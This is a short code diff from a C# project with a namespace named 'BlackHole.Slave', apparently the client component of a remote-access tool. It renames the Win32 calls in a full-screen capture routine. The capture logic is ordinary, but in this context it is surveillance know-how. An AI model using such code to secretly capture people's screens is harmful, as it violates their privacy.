@@ -33,12 +33,12 @@ namespace BlackHole.Slave
             using (var dest = Graphics.FromImage(screen))
             {
                 var destPtr = dest.GetHdc();
-                var srcPtr = Win32.CreateDC("DISPLAY", 
+                var srcPtr = Win32.gdi32_CreateDC("DISPLAY", 
                     null, 
                     null, 
                     IntPtr.Zero);
 
-                Win32.BitBlt(destPtr, 
+                Win32.gdi32_BitBlt(destPtr, 
                     0, 
                     0, 
                     bounds.Width, 
@@ -48,7 +48,7 @@ namespace BlackHole.Slave
                     bounds.Y, 
                     Win32.ROP_COPY);
 
-                Win32.DeleteDC(srcPtr);
+                Win32.gdi32_DeleteDC(srcPtr);
                 dest.ReleaseHdc(destPtr);
             }
 
